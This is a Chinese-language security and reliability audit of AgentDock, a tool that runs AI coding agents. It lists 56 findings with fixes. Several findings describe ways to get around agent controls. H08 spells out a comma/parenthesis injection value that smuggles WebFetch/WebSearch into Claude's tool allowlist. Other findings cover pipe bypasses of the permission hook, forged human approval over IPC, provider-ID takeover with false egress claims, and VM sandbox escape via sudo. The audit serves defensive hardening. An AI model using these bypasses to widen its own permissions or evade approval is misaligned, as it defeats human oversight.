# AgentDock 项目风险审查与改进清单

- 日期：2026-07-27
- 分支：`codex/agentdock-hardening-v1`（含未提交改动，一并审查）
- 审查方式：14 个智能体（7 个领域深读审查 + 7 个对抗性核查），每条发现均经二次独立读码核实，56/56 确认，0 驳回
- 测试基线（修复前）：`cargo test --workspace` 全绿；桌面端 `bun test` 223/223 通过
- 修复约定：逐项修复，每项完成后运行对应测试验证；新增/后续代码单文件尽量不超过 600 行（存量超限文件不强制拆分）

## 总览

| 严重级 | 数量 |
| --- | --- |
| 高危（High） | 14 |
| 中危（Medium） | 31 |
| 低危（Low） | 11 |
| 合计 | 56 |

| 领域 | 高 | 中 | 低 |
| --- | --- | --- | --- |
| 编排器核心 | 3 | 4 | 1 |
| 持久化层 | 2 | 3 | 3 |
| 运行时（进程/Git/守护进程） | 0 | 5 | 3 |
| Provider 适配与契约 | 4 | 3 | 1 |
| 桌面端 | 2 | 4 | 2 |
| 安全专项 | 2 | 6 | 0 |
| 工程化横切面 | 1 | 6 | 1 |

## 修复进度索引

- [x] **H01** 启动恢复流程无按任务错误隔离，单个异常任务可让守护进程永久无法启动（`crates/orchestrator/src/lifecycle.rs`）
- [x] **H02** 实时预算超限触发的取消会把任务永久卡死在 Developing/Reviewing 状态（`crates/orchestrator/src/development.rs`）
- [x] **H03** 验证步骤超时后子进程未被杀死：本地测试进程继续改写 worktree，远端与 rm -rf 清理竞态（`crates/orchestrator/src/execution_nodes.rs`）
- [x] **H04** 已发生过的迁移文件事后修改会让老库升级时 VersionMismatch 直接无法启动（`crates/persistence/src/tests.rs`）
- [x] **H05** daemon 调度循环任何一次数据库错误就永久停摆，而 Ping 仍然报告健康（`crates/daemon/src/scheduler.rs`）
- [x] **H06** 外部 sidecar 会话异常路径不杀子进程，且 stdout 行长无上限（`crates/provider-protocol/src/client.rs`）
- [x] **H07** 已信任发布者的外部包可顶替内置 Provider ID，且 egress 门禁依赖 manifest 自声明（`crates/provider-protocol/src/registry.rs`）
- [x] **H08** Claude --allowedTools 逗号拼接可被 extra_allowed_commands 注入任意工具白名单（`crates/agent-adapters/src/cli_providers.rs`）
- [x] **H09** JSON 候选扫描在输出截断或杂散大括号时会误吞/误判结果（`crates/agent-adapters/src/support.rs`）
- [x] **H10** 日志直播流与历史分页无行号对账，导致重复、乱序与缓冲被重置（`apps/desktop/src/hooks/useRunLog.ts`）
- [x] **H11** 事件桥每 300ms 全表扫描 + 全量重读日志文件，随数据增长必然拖垮桌面端（`apps/desktop/src-tauri/src/event_bridge.rs`）
- [x] **H12** daemon 本地 IPC 完全没有身份认证，同用户进程可冒充人工批准（`crates/daemon/src/lib.rs`）
- [ ] **H13** 权限代理只覆盖 Claude，其余 Provider 以 yolo/dontAsk 运行且授权结果从不下发（`crates/agent-adapters/src/cli_providers.rs`）
- [x] **H14** src-tauri 被排除出 workspace：其测试在 CI 中从不运行，macOS 专属代码从不在 CI 编译（`Cargo.toml`）
- [ ] **M01** 守护进程优雅停机的 requeue 不重置 worktree，被中断开发者的半成品会污染下一轮修订（`crates/orchestrator/src/lifecycle.rs`）
- [ ] **M02** acquire_provider_dispatch 无限自旋且不感知停机/取消，令牌注册在获取槽位之后，停机可无限期挂起（`crates/orchestrator/src/scheduler_limits.rs`）
- [ ] **M03** review issue 的 resolved 判定仅凭 file+title 匹配，Provider fallback 换评审者时会批量误标『已解决』（`crates/orchestrator/src/review.rs`）
- [ ] **M04** 单评审模式的独立性只排除同一个 Provider，fallback 后同厂商 API 可评审自家 CLI 的产出（`crates/orchestrator/src/review.rs`）
- [ ] **M05** 每次运行都向 Keychain 写入 resume token，任务清除后永不删除，秘密无限累积（`crates/orchestrator/src/telemetry.rs`）
- [ ] **M06** daemon 每次启动都全量 VACUUM 备份并把整库读进内存加密，启动耗时/内存随库无界增长且桌面端无超时阻塞（`crates/persistence/src/protection.rs`）
- [ ] **M07** open_client 不校验 schema 版本，客户端与 daemon/库版本漂移时报晦涩的 no such column 错误（`crates/persistence/src/lib.rs`）
- [ ] **M08** Claude 权限钩子 allow 前缀匹配漏掉管道/重定向操作符，可绕过权限代理（`crates/daemon/src/main.rs`）
- [ ] **M09** 提交前/审批前密钥扫描跳过 1MB–5MB 的文件，存在确定性绕过路径（`crates/git-engine/src/lib.rs`）
- [ ] **M10** Git::output 所有 git 子进程无超时且未禁用交互提示，网络/凭证阻塞会永久挂起工作流（`crates/git-engine/src/lib.rs`）
- [ ] **M11** Provider stdout/stderr 落盘文件无大小上限，MAX_LOG_BYTES 只限制事件流不限制磁盘（`crates/process-supervisor/src/lib.rs`）
- [ ] **M12** 事件 sink 任务出错被 let _ 吞掉，预算熔断与权限提示检测会静默失效（`crates/orchestrator/src/agent_run.rs`）
- [ ] **M13** 结果契约 schema 演进无兼容策略：加一个字段会同时打破所有 CLI Provider 与历史工件（`crates/contracts/src/schemas.rs`）
- [ ] **M14** Kimi/MiniMax CLI 半接线：检测与设置入口齐全但没有适配器，mmx 兼容性校验为空（`crates/orchestrator/src/review.rs`）
- [ ] **M15** 运行路径的 CLI 解析用交互式登录 shell 且无超时，preflight 的 tool_status 也未加时限（`crates/agent-adapters/src/support.rs`）
- [ ] **M16** Tauri 窗口未配置 CSP，且外链 URL 直接来自远端数据未做协议校验（`apps/desktop/src-tauri/tauri.conf.json`）
- [ ] **M17** logStore 的 clear 从未被调用，日志缓冲随会话时长无限增长（`apps/desktop/src/stores/logStore.ts`）
- [ ] **M18** Tauri 事件 payload 类型为手写契约，无生成与 CI 漂移守护（`apps/desktop/src/lib/tauriEvents.ts`）
- [ ] **M19** TaskDetail 的恢复轮询是一次性的，事件订阅失效后界面可能永久冻结（`apps/desktop/src/routes/TaskDetail.tsx`）
- [ ] **M20** 备份解密在缺少魔数头时回退为明文，导致恢复流程可被伪造数据库劫持（`crates/persistence/src/protection.rs`）
- [ ] **M21** 本地数据密钥以明文文件缓存且与加密备份同目录，Keychain 保护形同虚设（`crates/persistence/src/protection.rs`）
- [ ] **M22** Provider resume 令牌写入 Keychain 后从不清理，任务删除后仍长期残留（`crates/orchestrator/src/storage.rs`）
- [ ] **M23** Claude Bash 预授权前缀匹配漏掉管道与重定向，可在不触发权限请求的情况下越权（`crates/daemon/src/main.rs`）
- [x] **M24** Lima 隔离可被 VM 内进程用免密 sudo 解除，且校验脚本只看首行无法发现放行规则（`scripts/verify-lima-isolation.sh`）
- [ ] **M25** 提交密钥检测存在可预期绕过：大文件跳过扫描、占位符判定过宽、规则覆盖不足（`crates/git-engine/src/lib.rs`）
- [ ] **M26** provider-compatibility 的 pinned 门禁中 Qoder 用 `curl | bash` 装最新版，pinned 名不副实（`.github/workflows/provider-compatibility.yml`）
- [x] **M27** verify-lima-isolation.sh 的网络隔离检查在 curl 缺失时假通过（fail-open）（`scripts/verify-lima-isolation.sh`）
- [x] **M28** bindings/schema 漂移守护用 `git diff --exit-code`，检测不到新增的未跟踪生成文件（`.github/workflows/ci.yml`）
- [ ] **M29** 测试覆盖严重失衡：agentflow-cli 整个 crate 零测试，daemon/contracts 覆盖稀薄（`crates/cli/src/main.rs`）
- [ ] **M30** CI 工具链全部不锁定且主测试门禁不带 --locked，可重复性和稳定性都受损（`.github/workflows/ci.yml`）
- [ ] **M31** 契约生成链依赖 RC/0.0.x 版本的 specta 且存在双 Cargo.lock，一次 cargo update 就能破坏字节级漂移守护（`Cargo.toml`）
- [ ] **L01** 事件 sink 任务失败被静默吞掉，实时预算熔断与权限提示检测会整体失效（`crates/orchestrator/src/agent_run.rs`）
- [ ] **L02** task/project 的 seq 用事务外的 SELECT MAX+1 生成，并发创建会撞 UNIQUE 约束（`crates/persistence/src/lib.rs`）
- [ ] **L03** 任务创建的多步写入跨越事务边界，崩溃会留下缺 delivery_records 的任务且后续更新静默丢失（`crates/orchestrator/src/task_creation.rs`）
- [ ] **L04** 备份恢复流程留下明文数据库副本且永不清理，与本地数据加密承诺漂移（`crates/persistence/src/protection.rs`）
- [ ] **L05** finish_queue_item 无状态守卫地覆写队列行，与 IPC 再入队存在竞态，任务会被静默卡死（`crates/daemon/src/scheduler.rs`）
- [ ] **L06** 发布槽位写入无 fsync、健康检查前先切 current 标记，崩溃可留下截断制品或未验证版本（`crates/release-engine/src/lib.rs`）
- [ ] **L07** LaunchAgent 日志无轮转且 KeepAlive 崩溃循环会持续写盘，daemon 自身日志无界增长（`crates/daemon/src/main.rs`）
- [ ] **L08** provider_list 每次调用都全量重扫注册表并对每个外部 Provider 起进程探活（`crates/orchestrator/src/lifecycle.rs`）
- [ ] **L09** useExecutionTree 订阅整个 buffers 对象，日志每次刷新触发整个详情页重渲染（`apps/desktop/src/hooks/useExecutionTree.ts`）
- [ ] **L10** ExecutionNodeSection 表单校验缺口：端口可提交 0、私钥路径不 trim，后端错误文案无法定位字段（`apps/desktop/src/routes/settings/ExecutionNodeSection.tsx`）
- [ ] **L11** README 的 Provider 支持描述已落后于代码：Qoder 完全缺席（`README.md`）

## 高危（High）

### H01. 启动恢复流程无按任务错误隔离，单个异常任务可让守护进程永久无法启动

- **位置**：`crates/orchestrator/src/lifecycle.rs:57`
- **领域**：编排器核心｜**分类**：崩溃/重启后状态一致性
- **状态**：✅ 已修复（2026-07-27）——恢复逻辑整合到新文件 `crates/orchestrator/src/recovery.rs`，每个恢复步骤按任务隔离：单任务失败记录 `recovery:task_failed` 事件、保存检查点、转入 Blocked(recovery_failed)（新增 BlockedReason 变体 + 桌面端修复中心文案），绝不阻止 daemon 启动。新增 2 个隔离测试（recovery_isolation_tests.rs）。
- **问题**：Orchestrator::open() 在 open_with_recovery 中同步执行 recover_interrupted_runs()（lifecycle.rs:56-58），该函数及其调用的 recover_start_operations（saga.rs:140-159）、recover_orphaned_stages（saga.rs:195-318）在逐任务循环里全部用 `?` 向上传播错误：lifecycle.rs:129 的 self.task() 用 fetch_one（任务行被删即 RowNotFound）、lifecycle.rs:148 的 revision_commit_sha（无修订行时返回 InvalidState）、lifecycle.rs:152 的 git reset（worktree 损坏即失败）、saga.rs:221-225 在 worktree HEAD 与记录提交不一致时显式返回 Err、saga.rs:151 的 continue_start_operation 在任务状态不匹配 intent 时返回 Err。任何一条失败都会让整个 open() 失败，daemon 起不来。
- **未来风险**：触发路径非常现实：用户在任务 worktree 里手动 git reset/checkout 后 daemon 重启，recover_orphaned_stages 命中 saga.rs:222 的 'orphaned development revision does not match worktree HEAD'；或某个 task_start 操作卡在 RUNNING 而目标分支已被删除。此后每次重启都在同一处失败——不是一次性故障而是永久砖化，所有项目的所有任务全部停摆，只能手工改 SQLite 才能恢复。
- **改进建议**：把恢复循环改为按任务隔离：每个任务的恢复放入独立的 Result 分支，失败时记录 recovery:failed 事件并把该任务置为 Blocked(RepairRequired) 继续处理下一个，绝不让单任务错误传播到 open()。对 saga.rs:221-225 这类一致性冲突，应转为该任务 Blocked + checkpoint，而不是返回 Err。
- **核查证据**：属实：lifecycle.rs:57 在 open_with_recovery 中以 `?` 调用 recover_interrupted_runs，而 daemon/src/lib.rs:242 `Orchestrator::open(&data_dir).await?` 失败即整个守护进程起不来；恢复循环内部全部用 `?` 逐任务传播——lifecycle.rs:129 的 self.task() 用 fetch_one（task_queries.rs:609-612，任务行被软删即 RowNotFound）、lifecycle.rs:148 revision_commit_sha、lifecycle.rs:152 reset_owned_worktree；saga.rs:221-225 在 worktree HEAD 与记录提交不一致时显式 `return Err(InvalidState)`，saga.rs:151 recover_start_operations 对 continue_start_operation 同样 `?`（saga.rs:77-81 任务状态不匹配 intent 即 Err）。任一任务命中即每次重启都在同一处失败，无任何按任务隔离或降级为 Blocked 的代码，属永久性启动失败。

### H02. 实时预算超限触发的取消会把任务永久卡死在 Developing/Reviewing 状态

- **位置**：`crates/orchestrator/src/development.rs:109`
- **领域**：编排器核心｜**分类**：任务状态机正确性
- **状态**：✅ 已修复（2026-07-27）——run_agent 用独立 AtomicBool 记录预算取消来源；预算取消不再伪装成用户取消，而是返回 BUDGET_EXCEEDED 错误；review/planning 的 Err 分支补上 enforce_budget 检查，任务正确落入 Blocked(budget_exceeded) 并可从 UI 补预算恢复。新增端到端测试 budget_cancel_tests.rs（假 Provider 发超额遥测→被实时熔断→任务 Blocked）。
- **问题**：run_agent 的事件 sink 在 live_budget_exceeded 命中时直接 live_cancel.cancel()（agent_run.rs:120-123），导致 outcome.cancelled=true。develop() 对该结果的处理是 `Ok(running) if running.outcome.cancelled => return Ok(())`（development.rs:109），review_single 同样（review.rs:89）——这个分支假设 cancelled 一定来自用户取消（此时任务状态已是 Cancelled），但预算取消时任务仍处于 Developing/Revising/Reviewing。develop 返回后 drive_task 的 match 落入 `_ => return`（development.rs:29），队列项被 finish_queue_item 标为 COMPLETED（daemon/src/scheduler.rs:121），没有任何代码再推进该任务。
- **未来风险**：只要 Claude Code / Codex 的一次运行中累计用量事件超过剩余预算（这正是预算功能的设计场景），任务就会显示为『开发中』但实际无进程、无预算 Blocked 提示，daemon 不重启就永远不动；用户既看不到 BudgetExceeded 的补预算入口，也无法从 UI 恢复。只有下次 daemon 重启时 recover_orphaned_stages 才顺带修复。
- **改进建议**：区分取消来源：在 sink 里用独立的 AtomicBool（类似 permission_prompt_seen）记录预算取消，run_agent 返回时据此让 develop/review 走 enforce_budget 的 Blocked(BudgetExceeded) 路径；或在 `outcome.cancelled` 分支里回读任务状态，若不是 Cancelled 则调用 enforce_budget/block 而不是直接 return Ok。
- **核查证据**：属实：agent_run.rs:120-123 的事件 sink 在 live_budget_exceeded 命中时直接 live_cancel.cancel()，process-supervisor/src/lib.rs:146,161 将该取消记为 outcome.cancelled=true；development.rs:109 `Ok(running) if running.outcome.cancelled => return Ok(())` 与 review.rs:89 都假设取消来自用户（未回读任务状态、未走 enforce_budget），此时任务仍处 Developing/Revising/Reviewing；drive_task 的 match 对该状态落入 development.rs:29 `_ => return`，daemon/src/scheduler.rs:121 把队列项标为 COMPLETED（claim_next 只取 QUEUED，scheduler.rs:61），此后无任何代码再推进该任务，只有 daemon 重启时 saga.rs:195 recover_orphaned_stages 才顺带修复。

### H03. 验证步骤超时后子进程未被杀死：本地测试进程继续改写 worktree，远端与 rm -rf 清理竞态

- **位置**：`crates/orchestrator/src/execution_nodes.rs:163`
- **领域**：编排器核心｜**分类**：资源泄漏/并发竞态
- **状态**：✅ 已修复（2026-07-27）——新增 `output_with_deadline`：验证命令在独立进程组中运行，超时后整组终止（复用 process-supervisor 新导出的 `terminate_spawned_group`），stdout/stderr 并发排水避免管道死锁；远端命令注入脱离 fd 的看门狗（本地截止+2 秒后 `kill -KILL -- -$$` 清理整个远端会话组），rm -rf 清理不再与执行中的步骤竞态；upload/cleanup 的 ssh 同样组杀。新增孙进程组杀测试。
- **问题**：execute_local_validation 用 tokio::time::timeout 包裹 Command::output()（execution_nodes.rs:163-166）但没有 kill_on_drop(true)：超时后 future 被 drop，tokio 默认不杀子进程，测试进程继续在 worktree 里运行。execute_remote_validation 的 ssh 调用（116-119 行）同理，本地 ssh 与远端命令都被泄漏，随后 146 行的 cleanup_remote_dir 会对仍在执行命令的远端目录 rm -rf。upload_remote_archive 的 120 秒超时（211-214 行）同样泄漏 ssh 进程。
- **未来风险**：某个验证步骤（如全量测试）超时后：编排器将任务转入 ReadyForRevision 并让下一个开发 Provider 在同一 worktree 上工作，而泄漏的测试进程仍在写 target/、node_modules、测试产物甚至源文件（如带自动格式化的测试），下一轮修订会把这些残留一并 commit_revision 提交，产生无法解释的脏修订；长超时步骤反复失败还会累积一批孤儿进程占满 CPU/磁盘。远端场景下清理与执行竞态导致节点上留下半删目录。
- **改进建议**：对所有被 timeout 包裹的 tokio Command 设置 .kill_on_drop(true)；更稳妥的做法是像 agent 运行那样通过 process supervisor 以进程组 spawn，超时时显式 kill 进程组并 wait 后再继续；远端步骤在超时后先 ssh kill 远端进程（或用远端 timeout(1) 包裹命令）再执行 cleanup_remote_dir。
- **核查证据**：属实：orchestrator 用的是 tokio::process::Command（lib.rs:29），execution_nodes.rs:163-166 本地验证、116-119 远端 ssh、211-214 上传均以 tokio::time::timeout 包裹 output()/wait_with_output()，且整个 orchestrator crate 无任何 kill_on_drop（全仓 grep 仅 agent-adapters/src/support.rs:893 一处），超时 drop future 后子进程默认继续运行；execution_nodes.rs:146 随即对可能仍在执行命令的远端目录 cleanup_remote_dir(rm -rf)。超时步骤置 report.passed=false 后任务立即转 ReadyForRevision 并在同一 worktree 启动下轮开发，而 git-engine/src/lib.rs:327 commit_revision 用 `git add -A` 提交全部变更，泄漏进程的残留写入会被混入修订。

### H04. 已发生过的迁移文件事后修改会让老库升级时 VersionMismatch 直接无法启动

- **位置**：`crates/persistence/src/tests.rs:6`
- **领域**：持久化层｜**分类**：升级/迁移风险
- **状态**：✅ 已修复（2026-07-27）——守护测试扩展为覆盖全部 23 个迁移文件的 SHA-384 冻结清单（改动任何已发布迁移或漏登记新迁移都会挂测试）；`Store::open` 在迁移前对 0001 的已知历史校验和做一次性原地修复（仅识别该确切旧值，其他不匹配仍然报错），老库升级不再变砖。新增修复回归测试。
- **问题**：git 历史显示 0001_initial.sql 在初始提交（12d4000）之后被 f1ac48d 修改过（追加了一个换行符）。sqlx 的迁移器会校验 _sqlx_migrations 表中记录的 SHA-384 与内嵌迁移文件的校验和，任何字节差异都会返回 MigrateError::VersionMismatch。tests.rs:6 的守护测试 published_initial_migration_bytes_never_change 只钉住了 0001 的『新』校验和，0002..0023 共 22 个已发布迁移完全没有守护；而且这个测试是在修改发生之后才加的，等于把破坏性变更固化了下来。
- **未来风险**：任何由 f1ac48d 之前的构建创建/迁移过的数据库（包括开发者自己的库和早期用户库），用新版本打开时 sqlx::migrate!().run 在 lib.rs:84 直接报错；错误路径只是恢复迁移前备份然后返回 Err，daemon 每次启动都重复失败，形成永久性启动死循环，没有任何自愈或提示路径。同样地，只要将来任何人再动一下 0002..0023 中任意一个文件（哪怕格式化工具加个换行），所有存量安装在升级后全部变砖。
- **改进建议**：1) 把守护测试扩展为对 migrations/ 目录下全部文件生成校验和清单（冻结文件）并逐一断言，CI 阻止任何对已发布迁移的修改；2) 在 Store::open 中对已知的 0001 新旧两个校验和做一次性修复：打开时若 _sqlx_migrations 中 version=1 的校验和等于旧值，则原地 UPDATE 为新值再运行迁移器；3) 迁移失败时给出可操作的错误信息（区分校验和不匹配与真实 SQL 失败）。
- **核查证据**：git diff 12d4000..f1ac48d 确认 0001_initial.sql 在末尾追加了一个空行，旧字节 SHA-384 为 3f72f0c6...，新字节为 1ce8056...（与 crates/persistence/src/tests.rs:11 钉住的『新』值一致）；git 历史显示 12d4000 与 f1ac48d 之间还有 dd2293c/49eace3/87533d3/96974fc 等多个提交（含另一贡献者的 merge PR），这些版本创建的库在 _sqlx_migrations 中记录的是旧校验和，sqlx::migrate!().run（crates/persistence/src/lib.rs:84）默认校验已应用迁移的校验和，必然返回 VersionMismatch；错误路径 lib.rs:85-92 仅恢复备份后返回 Err，无任何校验和修复逻辑（全仓 grep _sqlx_migrations/VersionMismatch 无处理代码），daemon 每次启动重复失败；且 tests.rs:5-14 只守护 0001，0002..0023 共 22 个已发布迁移无守护，f1ac48d 已实际证明这种事后修改会发生

### H05. daemon 调度循环任何一次数据库错误就永久停摆，而 Ping 仍然报告健康

- **位置**：`crates/daemon/src/scheduler.rs:35`
- **领域**：持久化层｜**分类**：错误处理吞异常/可用性
- **状态**：✅ 已修复（2026-07-27）——scheduler_loop 改为 log-and-continue（与 maintenance_loop 一致），瞬时数据库错误只跳过本次 tick；新增心跳时间戳，Ping 响应增加 `schedulerAlive` 字段，健康检查真实反映调度能力；桌面端升级路径改为「队列非空且调度器存活」才推迟升级，避免停摆时的升级死锁。新增故障注入+恢复测试。
- **问题**：scheduler_loop 的 tick 分支里 settings_get(...).await?（scheduler.rs:35）、claim_next(...).await?（:41）等都用 ? 直接把错误抛出循环，导致整个 scheduler_loop 返回 Err。serve 在 daemon/src/lib.rs:250-253 用 tokio::spawn 启动它之后不再监视，只有进程关闭时才 join；出错后没有任何重启逻辑。对比同文件的 maintenance_loop（lib.rs:306 起）是 log-and-continue，说明调度循环的 ? 是遗漏而非设计。触发路径是真实存在的：例如 database_backup_restore 会关闭连接池（protection.rs:237 pool.close()），之后下一个 tick 的 settings_get 立即报 pool closed；瞬时磁盘 I/O 错误、SQLITE_BUSY 超过 5 秒等也一样。
- **未来风险**：一次瞬时错误后，daemon 进程活着、IPC Ping 正常、桌面端显示一切健康，但 daemon_queue 里的任务永远停在 QUEUED 不再被认领；用户看到的现象是『任务卡住不动』且无任何报错。更糟的是 queue_depth>0 还会阻止桌面端触发的 daemon 升级重启（daemon_client.rs:60-64），形成需要手动杀进程才能恢复的死锁。
- **改进建议**：把 tick 分支内的每个可失败操作改为记录日志并 continue（与 maintenance_loop 一致），或在 serve 中监视 scheduler JoinHandle、退出即带退避地重启循环；同时在 Ping 响应里暴露调度循环存活状态，让健康检查真实反映后台能力。
- **核查证据**：crates/daemon/src/scheduler.rs:35/36/41 在 tick 分支用 ? 将 settings_get/global_budget_exhausted/claim_next 的错误直接抛出，使 scheduler_loop 返回 Err 后循环永久终止；crates/daemon/src/lib.rs:250-253 tokio::spawn 后不监视 JoinHandle，仅在 shutdown 时（lib.rs:278）join，无重启逻辑；对比 maintenance_loop（lib.rs:306-322）全部 log-and-continue，证实 ? 是遗漏；Ping 响应（lib.rs:357-362）只返回 pid/version/ipcVersion/queueDepth，不含调度循环存活状态；且 apps/desktop/src-tauri/src/daemon_client.rs 中 queue_depth>0 时拒绝升级 daemon 的逻辑属实，停摆后 QUEUED 任务使 queueDepth>0 进而阻断升级自救。唯一修正：审查员举的 database_backup_restore 触发例受 lib.rs:599 紧随其后的 shutdown.cancel() 削弱（仅 500ms tick 窗口内可命中），但磁盘 I/O 错误、busy_timeout 5 秒超时（lib.rs:73）等瞬时错误路径依然成立

### H06. 外部 sidecar 会话异常路径不杀子进程，且 stdout 行长无上限

- **位置**：`crates/provider-protocol/src/client.rs:269`
- **领域**：Provider 适配与契约｜**分类**：资源泄漏/安全
- **状态**：✅ 已修复（2026-07-27）——外部 sidecar 的异常、取消与违约输出路径都会终止并回收子进程；stdout 使用有界读取，超长行会被拒绝并触发隔离。新增 conformance 测试覆盖脏 stdout、超长行、取消和权限篡改。
- **问题**：Session::spawn（client.rs:265-307）创建 sidecar 进程时没有设置 kill_on_drop(true)，也没有为 Session 实现 Drop。run() 的多个错误路径会在 kill/shutdown 之前提前 return：handle_run_message（client.rs:212-216）对每一行 stdout 直接 `serde_json::from_str(line)?`，任何一行非 JSON 的杂散输出（sidecar 打印诊断信息、崩溃栈）都会让 run() 以 ProtocolError::Json 提前返回；client.rs:119 的 Closed 路径同样直接返回。此时 Session 被 drop，但 tokio 的 Child 默认不随 drop 终止，sidecar 进程成为孤儿继续运行。另外 client.rs:107 与 client.rs:347 用 read_line 读取 sidecar stdout，行长度完全无上限——stderr 有 MAX_STDERR_BYTES=1MiB 的封顶（client.rs:21），stdout 却可以被一个不输出换行符的恶意/失控 sidecar 无限撑大 daemon 内存。这是外部不可信代码与核心之间的信任边界。
- **未来风险**：任何一个第三方 Provider 包在 stdout 混入一行非 JSON 输出（这在 CLI 生态里极常见），daemon 每次运行都会泄漏一个持续占用 CPU/内存/API 配额的孤儿进程，长期运行的 daemon 进程数持续增长；恶意包则可用一条超长不换行的 stdout 行直接 OOM 掉 daemon，导致所有任务中断。
- **改进建议**：在 Session::spawn 的 Command 上设置 kill_on_drop(true)（或为 Session 实现 Drop 中 start_kill）；handle_run_message 对无法解析的行记录到 problems 后 Continue 而不是让整个 run 失败（NDJSON 协议应容忍脏行或至少 kill 后再返回错误）；用带上限的读取（如 take(N) 包装 BufReader 或手写限长 read_until）替代裸 read_line，超限即判定 Provider 违约并 kill。
- **核查证据**：client.rs:269-306 的 Session::spawn 未设 kill_on_drop 也无 Drop 实现；run() 在 client.rs:119（Closed）、121（handle_run_message 的 `?`，其 client.rs:216 对每行 stdout 直接 serde_json::from_str(line)?）、127（Io）三处都在 133-137 行的 kill/shutdown 之前提前 return，88 行 handshake 失败同样提前返回，孤儿 sidecar 继续运行；client.rs:107 与 347 用无上限 read_line 读 stdout，而 stderr 有 MAX_STDERR_BYTES=1MiB 封顶（client.rs:21、413-416），一条不换行的超长 stdout 可无限撑大内存。

### H07. 已信任发布者的外部包可顶替内置 Provider ID，且 egress 门禁依赖 manifest 自声明

- **位置**：`crates/provider-protocol/src/registry.rs:178`
- **领域**：Provider 适配与契约｜**分类**：安全
- **状态**：✅ 已修复 ID 接管与重复 ID 部分（2026-07-27）——信任存储新增 `builtinOverrides`（发布者 → 具体内置 ID 白名单）：外部包默认只能使用 External 命名空间 ID，要以 compatibility shim 顶替 `claude_code`/`codex` 等内置 ID，必须由用户按「发布者→ID」再做一次显式授权，否则签名合法也一律隔离；两个包声明同一 ID 时二者一并隔离，不再按 read_dir 顺序静默 last-wins。`04-Provider协议-v1.0.md` 同步说明。新增 2 个测试（未授权接管被拒 + 授权后放行、重复 ID 双隔离）。**未覆盖部分**：egress 声明的运行时强制仍依赖 manifest 自声明，需要 OS 级网络隔离（本分支 scripts/setup-lima-isolation.sh 方向）才能真正约束 sidecar，属独立工作项。
- **问题**：provider-trust.json 是扁平的 publisher→公钥表（registry.rs:32-37），verify_package（registry.rs:178-181）只验证「该发布者签过这个 manifest」，不限制发布者可以声明哪些 Provider ID。而 AgentKind 反序列化会把 "claude_code" 等内置 ID 字符串解析为内置变体（contracts/src/providers.rs:66-89），orchestrator 的 adapter() 又永远先查外部 registry（orchestrator/src/review.rs:274-282），provider_list 的注释也明说外部包会替换同 ID 的内置描述符（orchestrator/src/lifecycle.rs:330-331）。于是任何一个被用户信任过的第三方发布者（比如为了装一个小众 CLI shim 而加进 trust store）都可以在后续版本里把包 ID 改成 claude_code，签名依然合法，从此静默接管所有 Claude 任务的执行（拿到 worktree 写权限，且 Session 传入 HOME，可读用户凭据文件）。同时 egress 审批（review.rs:377-390）对外部包完全依赖 manifest 自声明的 execution_location/data_egress/network_domains——sidecar 进程本身没有任何 OS 级沙箱，声明 local/none 即可绕过人工 egress 审批实际外发代码。另外 registry.rs:91 对重复 ID 是 read_dir 顺序 last-wins，两个包声明同一 ID 时结果不确定。
- **未来风险**：供应链攻击路径：用户信任发布者 A 安装其正常 shim → A 被入侵或恶意更新，新版本 manifest 改 id 为 claude_code 且声明零 egress → 更新后所有标记为 Claude 的任务实际由恶意 sidecar 执行，源码可被外发，桌面端 UI 上任务仍显示为 Claude Code，人工审批的 egress 关卡形同虚设。
- **改进建议**：trust store 为每个发布者绑定允许的 ID 前缀/名单（例如强制外部包只能用 External 命名空间 ID）；外部包声明内置 ID（compatibility shim）时必须单独走一次显式人工确认并在任务/运行记录里持续标注「已被外部包接管」；egress 声明不可信时至少在运行层面对 sidecar 加网络隔离（如 sandbox-exec / Lima 隔离，本分支已有 scripts/setup-lima-isolation.sh 方向）；registry 发现重复 ID 时应整体 quarantine 而非静默覆盖。
- **核查证据**：manifest.rs:28 的 manifest.id 类型即 AgentKind，providers.rs:70-71 会把 "claude_code" 解析为内置变体；verify_package（registry.rs:178-181）只查 publisher 是否受信、不绑定发布者可用的 ID；review.rs:274-282 adapter() 永远先查外部 registry，lifecycle.rs:330-331 注释明确外部包替换同 ID 内置描述符，全仓库无任何「外部包声明内置 ID 需额外确认」的守卫；egress 判定 review.rs:377-390 完全取 manifest 自声明字段，Session::spawn（client.rs:277）传入 HOME 且无 OS 沙箱；registry.rs:91 对重复 ID 按 read_dir 顺序 last-wins。

### H08. Claude --allowedTools 逗号拼接可被 extra_allowed_commands 注入任意工具白名单

- **位置**：`crates/agent-adapters/src/cli_providers.rs:89`
- **领域**：Provider 适配与契约｜**分类**：安全
- **状态**：✅ 已修复（2026-07-27）——新增 `validate_extra_allowed_command` 字符白名单（仅允许字母数字、空格与 `- _ . / = : @ +`，拒绝逗号/括号/换行等列表分隔符），在 `start_process` 这一所有 CLI Provider 的唯一咽喉处校验，不合规即在进程启动前失败；`load_trusted_config` 同样拒绝含不安全条目的项目配置（即便字节已被人工信任），因为审批人看到的是一条散文字符串而 CLI 会把它拆成多个工具模式。新增注入用例与端到端拒绝测试。
- **问题**：claude_args 把 extra_allowed_commands 逐条格式化为 `Bash({value}:*)`（cli_providers.rs:89-93）再用逗号 join 成单个 --allowedTools 参数（cli_providers.rs:103）。value 来自项目仓库内 .agentflow 配置（orchestrator/src/config_trust.rs:99-105，agent_run.rs:202），整条链路没有任何字符校验：一个形如 `git fetch:*),WebFetch,WebSearch,Bash(curl` 的「命令」会被 Claude CLI 解析成四个独立的工具模式，凭空放行 WebFetch/WebSearch——而 PreToolUse 权限钩子的 matcher 只有 "Bash"（cli_providers.rs:121-132），对注入的非 Bash 工具完全不设防。人工信任 .agentflow 配置时，UI 展示的只是一条看似普通的字符串，语义拆分发生在 Claude CLI 内部，审批人很难察觉。
- **未来风险**：开发 agent 本身被禁止改 .agentflow，但配置信任流程依赖人工识别；任何能让一条含逗号/括号的字符串进入 extra_allowed_commands 的途径（恶意 PR 修改项目配置、模板复制）都会在下一次任务运行时给 agent 打开未经审批的网络访问（WebFetch/WebSearch 数据外发）或额外 Bash 前缀，绕过整套权限 broker 设计。
- **改进建议**：在 config_trust 校验与 claude_args 两处都对 extra_allowed_commands 做白名单字符校验（拒绝 `,`、`(`、`)`、换行等），不符合即拒绝启动运行；同时把钩子 matcher 与 allowedTools 生成统一从一个经过校验的结构化类型产出，避免字符串拼接。
